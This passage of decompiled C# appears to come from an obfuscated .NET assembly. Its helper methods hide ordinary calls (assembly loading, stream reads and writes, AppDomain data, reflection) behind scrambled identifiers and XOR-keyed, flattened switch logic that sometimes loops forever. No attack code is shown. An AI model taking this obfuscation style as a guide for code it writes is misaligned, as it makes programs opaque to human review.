        chArray = new char[num2 = Ⴗ.Ⴐ.ႰႣ(str2, 222, 212)];
        ⴅⴐ = Ⴗ.Ⴐ.ႥႰ;
        length = ⴅⴐ.Length;
        num1 = 15;
      }
label_4:
      string str4 = str1;
      Ⴗ.Ⴐ.ႨႼ();
      return str4;
label_30:
      return str1;
    }

    internal static Assembly ႥႣ([In] int obj0, [In] int obj1)
    {
label_3:
      int num1;
      switch (obj1 ^ obj0)
      {
        case 12:
          num1 = 8;
          break;
        case 13:
          num1 = 2;
          break;
        default:
          num1 = 0;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            num2 = 3;
            continue;
          case 1:
          case 3:
          case 7:
            goto label_3;
          case 2:
          case 4:
            goto label_10;
          case 6:
            num2 = 3;
            continue;
          case 8:
            goto label_9;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴐ.ႥႣ);
            num2 = 3;
            continue;
        }
      }
label_9:
      Assembly executingAssembly = Assembly.GetExecutingAssembly();
      Ⴗ.Ⴗ.Ⴓ();
      return executingAssembly;
label_10:
      return Assembly.GetExecutingAssembly();
    }

    internal static string ႥႳ([In] object obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 12:
          num1 = 5;
          break;
        default:
          num1 = 0;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            num2 = 7;
            continue;
          case 1:
          case 7:
            goto label_3;
          case 2:
          case 5:
            goto label_8;
          case 3:
          case 6:
            num2 = 7;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴐ.ႥႳ);
            num2 = 7;
            continue;
        }
      }
label_8:
      string str = obj0.ToString();
      Ⴗ.Ⴐ.ႭႳ();
      return str;
    }

    internal static bool ႥႷ([In] string obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
label_3:
      int num1;
      switch (obj3 ^ obj2)
      {
        case 20:
          num1 = 4;
          break;
        default:
          num1 = 0;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            num2 = 7;
            continue;
          case 1:
          case 2:
          case 5:
            num2 = 7;
            continue;
          case 4:
            goto label_8;
          case 6:
          case 7:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴐ.ႥႷ);
            num2 = 7;
            continue;
        }
      }
label_8:
      int num3 = obj0.Contains(obj1) ? 1 : 0;
      Ⴗ.Ⴗ.ႨႥ();
      return num3 != 0;
    }

    internal static MethodInfo[] ႥႼ([In] Type obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 114:
          num1 = 0;
          break;
        default:
          num1 = 4;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 2:
            goto label_8;
          case 1:
          case 7:
            num2 = 3;
            continue;
          case 3:
            goto label_3;
          case 4:
          case 5:
            num2 = 3;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴐ.ႥႼ);
            num2 = 3;
            continue;
        }
      }
label_8:
      MethodInfo[] methods = obj0.GetMethods();
      Ⴗ.Ⴗ.ႨႥ();
      return methods;
    }

    internal static AppDomain ႰႤ([In] int obj0, [In] int obj1)
    {
label_3:
      int num1;
      switch (obj1 ^ obj0)
      {
        case 116:
          num1 = 4;
          break;
        default:
          num1 = 5;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 1:
          case 3:
          case 7:
            num2 = 2;
            continue;
          case 2:
            goto label_3;
          case 4:
            goto label_8;
          case 5:
            num2 = 2;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴐ.ႰႤ);
            num2 = 2;
            continue;
        }
      }
label_8:
      AppDomain currentDomain = AppDomain.CurrentDomain;
      Ⴗ.Ⴐ.ႭႤ();
      return currentDomain;
    }

    internal static int ႰႨ([In] Stream obj0, [In] byte[] obj1, [In] int obj2, [In] int obj3, [In] int obj4, [In] int obj5)
    {
label_3:
      int num1;
      switch (obj5 ^ obj4)
      {
        case 21:
          num1 = 5;
          break;
        case 22:
          num1 = 4;
          break;
        default:
          num1 = 1;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            num2 = 8;
            continue;
          case 1:
          case 2:
            num2 = 8;
            continue;
          case 3:
          case 4:
            goto label_10;
          case 5:
          case 7:
            goto label_9;
          case 8:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴐ.ႰႨ);
            num2 = 8;
            continue;
        }
      }
label_9:
      int num3 = obj0.Read(obj1, obj2, obj3);
      Ⴗ.Ⴐ.ႨႣ();
      return num3;
label_10:
      return obj0.Read(obj1, obj2, obj3);
    }

    internal static void ႰႭ([In] Stream obj0, [In] byte[] obj1, [In] int obj2, [In] int obj3, [In] int obj4, [In] int obj5)
    {
      int num1 = 0;
      while (true)
      {
        switch (num1)
        {
          case 1:
            num1 = 0;
            continue;
          case 2:
          case 3:
            goto label_7;
          case 4:
          case 5:
            goto label_8;
          default:
            int num2;
            switch (obj5 ^ obj4)
            {
              case 124:
                num2 = 2;
                break;
              default:
                num2 = 1;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_7:
      obj0.Write(obj1, obj2, obj3);
label_8:
      Ⴗ.Ⴐ.ႥႨ();
    }

    internal static byte[] ႰႥ([In] MemoryStream obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 68:
          num1 = 5;
          break;
        default:
          num1 = 3;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            num2 = 2;
            continue;
          case 2:
          case 6:
            goto label_3;
          case 3:
            num2 = 2;
            continue;
          case 4:
          case 5:
            goto label_8;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴐ.ႰႥ);
            num2 = 2;
            continue;
        }
      }
label_8:
      byte[] array = obj0.ToArray();
      Ⴗ.Ⴐ.ႭႳ();
      return array;
    }

    internal static Evidence ႰႰ([In] Assembly obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 82:
          num1 = 5;
          break;
        default:
          num1 = 7;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 1:
          case 4:
            goto label_3;
          case 2:
          case 3:
            num2 = 1;
            continue;
          case 5:
          case 6:
            goto label_8;
          case 7:
            num2 = 1;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴐ.ႰႰ);
            num2 = 1;
            continue;
        }
      }
label_8:
      Evidence evidence = obj0.Evidence;
      Ⴗ.Ⴗ.ႨႥ();
      return evidence;
    }

    internal static object ႰႠ([In] AppDomain obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
label_0:
      switch ((obj3 ^ obj2) - 21)
      {
        case 0:
          return obj0.GetData(obj1);
        case 1:
          return obj0.GetData(obj1);
        case 2:
          return obj0.GetData(obj1);
        case 3:
          return obj0.GetData(obj1);
        case 4:
          return obj0.GetData(obj1);
        case 5:
          return obj0.GetData(obj1);
        case 6:
          return obj0.GetData(obj1);
        case 7:
          return obj0.GetData(obj1);
        case 8:
          return obj0.GetData(obj1);
        case 9:
          return obj0.GetData(obj1);
        case 10:
          return obj0.GetData(obj1);
        case 11:
          return obj0.GetData(obj1);
        case 12:
          return obj0.GetData(obj1);
        case 13:
          return obj0.GetData(obj1);
        case 14:
          return obj0.GetData(obj1);
        case 15:
          return obj0.GetData(obj1);
        case 16:
          return obj0.GetData(obj1);
        case 17:
          return obj0.GetData(obj1);
        case 18:
          return obj0.GetData(obj1);
        case 19:
          return obj0.GetData(obj1);
        case 20:
          return obj0.GetData(obj1);
        case 21:
          return obj0.GetData(obj1);
        case 22:
          return obj0.GetData(obj1);
        case 23:
          return obj0.GetData(obj1);
        case 24:
          return obj0.GetData(obj1);
        case 25:
          return obj0.GetData(obj1);
        case 26:
          return obj0.GetData(obj1);
        case 27:
          return obj0.GetData(obj1);
        case 28:
          return obj0.GetData(obj1);
        case 29:
          return obj0.GetData(obj1);
        case 30:
          return obj0.GetData(obj1);
        case 31:
          return obj0.GetData(obj1);
        default:
          goto label_0;
      }
    }

    internal static int ႰႣ([In] string obj0, [In] int obj1, [In] int obj2)
    {
label_0:
      switch ((obj2 ^ obj1) - 10)
      {
        case 0:
          return obj0.Length;
        default:
          goto label_0;
      }
    }

    internal static char ႰႳ([In] string obj0, [In] int obj1, [In] int obj2, [In] int obj3)
    {
label_0:
      switch ((obj3 ^ obj2) - 13)
      {
        case 0:
          return obj0[obj1];
        default:
          goto label_0;
      }
    }
  }
}
